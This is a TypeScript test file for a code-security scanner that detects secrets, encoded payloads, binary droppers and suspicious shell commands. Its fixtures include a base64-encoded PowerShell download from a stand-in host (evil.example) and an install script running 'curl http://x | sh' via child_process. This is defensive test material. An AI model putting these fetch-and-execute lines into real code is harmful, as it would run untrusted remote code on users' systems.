import test from "node:test";
import assert from "node:assert/strict";
import type { FileRecord } from "../../../../utils/file-system.js";
import { binaryArtifactDetector } from "../binaryArtifactDetector.js";
import { encodedPayloadDetector } from "../encodedPayloadDetector.js";
import { secretPatternDetector } from "../secretPatternDetector.js";
import { suspiciousCommandDetector } from "../suspiciousCommandDetector.js";

function file(relativePath: string, content: string | undefined, size = content?.length ?? 2048, extension?: string): FileRecord {
  return {
    relativePath,
    absolutePath: relativePath,
    extension: extension ?? relativePath.slice(relativePath.lastIndexOf(".")).toLowerCase(),
    content,
    size
  };
}

test("secretPatternDetector detects hardcoded secrets in file content", async () => {
  const findings = await secretPatternDetector.detect({
    files: [file(".env", "OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz123456\nDB_PASSWORD=supersecretvalue")]
  });

  assert.ok(findings.some((finding) => finding.ruleId === "secret.env.openai-api-key"));
  assert.ok(findings.some((finding) => finding.ruleId === "secret.env.db-password"));
});

test("secretPatternDetector detects private key blocks", async () => {
  const findings = await secretPatternDetector.detect({
    files: [file("keys/dev.pem", "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----")]
  });

  assert.equal(findings[0]?.severity, "critical");
  assert.equal(findings[0]?.category, "secret");
});

test("encodedPayloadDetector detects suspicious base64 content", async () => {
  const payload = Buffer.from("powershell -enc Invoke-WebRequest http://evil.example/payload".repeat(8), "utf8").toString("base64");
  const findings = await encodedPayloadDetector.detect({
    files: [file("src/config.txt", `const blob = \"${payload}\";\nconst run = atob(blob);`)]
  });

  assert.ok(findings.some((finding) => finding.ruleId.startsWith("encoded.base64") || finding.ruleId.startsWith("obfuscation.")));
});

test("binaryArtifactDetector classifies binary artifact in unusual location", async () => {
  const findings = await binaryArtifactDetector.detect({
    files: [file("src/lib/dropper.jar", undefined, 640000, ".jar")]
  });

  assert.ok(findings.some((finding) => finding.ruleId === "binary.packaged.embedded-artifact"));
  assert.ok(findings.some((finding) => finding.severity === "high"));
});

test("suspiciousCommandDetector detects command execution patterns", async () => {
  const findings = await suspiciousCommandDetector.detect({
    files: [file("scripts/install.js", "const cp = require('child_process');\ncp.exec('curl http://x | sh')")]
  });

  assert.ok(findings.some((finding) => finding.ruleId === "command.execution.suspicious-shell-spawn"));
});
